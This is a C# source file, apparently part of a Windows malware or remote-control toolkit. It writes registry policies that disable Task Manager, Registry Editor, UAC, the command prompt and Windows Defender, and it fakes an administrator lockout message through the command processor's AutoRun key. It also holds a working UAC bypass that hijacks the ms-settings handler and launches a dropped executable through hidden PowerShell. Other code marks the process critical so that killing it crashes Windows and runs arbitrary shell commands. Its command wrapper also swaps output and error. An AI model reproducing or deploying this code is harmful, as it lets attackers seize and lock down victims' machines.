using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace BaseApp
{
    public class CmdResult
    {
        public string Error { get; set; }
        public string Output { get; set; }
        public string Command { get; set; }

        public CmdResult(string error, string output, string command)
        {
            Error = error;
            Output = output;
            Command = command;
        }
    }

    public static class WinTool
    {
        public enum TOOL
        {
            RegistryTools,
            TaskManager,
            UserAccountControl,
            CMD,
            CMDSemi,
            WindowsDefender
        }

        private static readonly string CmdSemiDisableCommand = "@echo off && echo. && echo The command prompt has been disabled by your administrator. && echo. && pause && exit";

        static public bool IsDisabled(TOOL tool)
        {
            try
            {
                switch (tool)
                {
                    case TOOL.TaskManager:
                        RegistryKey taskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", false);
                        int tmvalue = (int)taskmgr.GetValue("DisableTaskMgr");
                        taskmgr.Close();
                        return tmvalue == 1;
                    case TOOL.RegistryTools:
                        RegistryKey regedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", false);
                        int revalue = (int)regedit.GetValue("DisableRegistryTools");
                        regedit.Close();
                        return revalue == 1;
                    case TOOL.UserAccountControl:
                        RegistryKey uac = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", false);
                        int uacvalue = (int)uac.GetValue("EnableLUA");
                        uac.Close();
                        return uacvalue == 0;
                    case TOOL.CMD:
                        RegistryKey cmd = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System", false);
                        int cmdvalue = (int)cmd.GetValue("DisableCMD");
                        cmd.Close();
                        return cmdvalue == 1;
                    case TOOL.CMDSemi:
                        RegistryKey cmdSemi = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Command Processor", false);
                        string cmdsemivalue = (string)cmdSemi.GetValue("AutoRun");
                        cmdSemi.Close();
                        return cmdsemivalue == CmdSemiDisableCommand;
                }
            }
            catch { }
            return false;
        }

        static public void Enable(TOOL tool)
        {
            switch (tool)
            {
                case TOOL.TaskManager:
                    RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    distaskmgr.SetValue("DisableTaskMgr", (object)0, RegistryValueKind.DWord);
                    break;
                case TOOL.RegistryTools:
                    RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    disregedit.SetValue("DisableRegistryTools", (object)0, RegistryValueKind.DWord);
                    break;
                case TOOL.UserAccountControl:
                    RegistryKey keyUAC = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    keyUAC.SetValue("EnableLUA", (object)1, RegistryValueKind.DWord);
                    break;
                case TOOL.CMD:
                    RegistryKey keyCmd = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
                    keyCmd.SetValue("DisableCMD", (object)0, RegistryValueKind.DWord);
                    break;
                case TOOL.CMDSemi:
                    RegistryKey keyCmdSemi = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Command Processor");
                    keyCmdSemi.SetValue("AutoRun", "", RegistryValueKind.ExpandString);
                    break;
                case TOOL.WindowsDefender:
                    WinDefender.EnableMain();
                    break;
            }
        }

        static public void Disable(TOOL tool)
        {
            switch (tool)
            {
                case TOOL.TaskManager:
                    RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    distaskmgr.SetValue("DisableTaskMgr", (object)1, RegistryValueKind.DWord);
                    break;
                case TOOL.RegistryTools:
                    RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    disregedit.SetValue("DisableRegistryTools", (object)1, RegistryValueKind.DWord);
                    break;
                case TOOL.UserAccountControl:
                    RegistryKey keyUAC = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    keyUAC.SetValue("EnableLUA", (object)0, RegistryValueKind.DWord);
                    break;
                case TOOL.CMD:
                    RegistryKey keyCmd = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
                    keyCmd.SetValue("DisableCMD", (object)1, RegistryValueKind.DWord);
                    break;
                case TOOL.CMDSemi:
                    RegistryKey keyCmdSemi = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Command Processor");
                    keyCmdSemi.SetValue("AutoRun", CmdSemiDisableCommand, RegistryValueKind.ExpandString);
                    break;
                case TOOL.WindowsDefender:
                    WinDefender.DisableMain();
                    break;
            }
        }
    }

    public static class WinProcess
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool IsProcessCritical(IntPtr hProcess, ref bool Critical);

        static public (string message, int code) BypassUAC()
        {
            if (IsAdministrator())
            {
                return ("The process is already running with admin privileges.", 1);
            }
            try
            {
                string runPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmp001x.exe";
                RegistryKey reg1 = Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\Shell\\Open\\command");
                reg1.SetValue("", GetCurrentProcess().MainModule.FileName, RegistryValueKind.String);
                RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\Shell\\Open\\command");
                reg2.SetValue("DelegateExecute", "", RegistryValueKind.String);
                File.WriteAllBytes(runPath, Properties.Resources.run);
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = $"Start-Process \"{runPath}\""
                };
                Process run = Process.Start(psi);
                run.WaitForExit();
                return ("Tried to bypass UAC. A new process with admin privileges should start.", run.ExitCode);
            }
            catch
            {
                return ("A error occured while trying to bypass the UAC.", 2);
            }
        }

        static public Process GetCurrentProcess()
        {
            return Process.GetCurrentProcess();
        }

        static public void RunAsAdmin(Process proc)
        {
            proc.StartInfo.Verb = "runas";
            proc.Start();
        }

        static public CmdResult Cmd(string command)
        {
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + command;
            p.Start();
            string output = p.StandardOutput.ReadToEnd();
            string error = p.StandardError.ReadToEnd();
            p.WaitForExit();
            return new CmdResult(output, error, command);
        }

        static public void SetCritical()
        {
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
        }

        static public void SetNotCritical()
        {
            RtlSetProcessIsCritical(0, 0, 0);
        }

        static public bool IsAdministrator()
        {
            bool flag;
            using (WindowsIdentity current = WindowsIdentity.GetCurrent())
                flag = new WindowsPrincipal(current).IsInRole(WindowsBuiltInRole.Administrator);
            return flag;
        }

        static private void ExeHidden(string file, string arg)
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = file,
                Arguments = arg
            };
            Process.Start(psi);
        }

        static public void End(Process process, bool force = true)
        {
            string arg = "/pid " + process.Id;
            if (force) arg += " /f";
            ExeHidden("taskkill.exe", arg);
        }

        static public bool IsCritical(Process proc)
        {
            bool criticalProcess = false;
            IsProcessCritical(proc.Handle, ref criticalProcess);
            return criticalProcess;
        }
    }
}
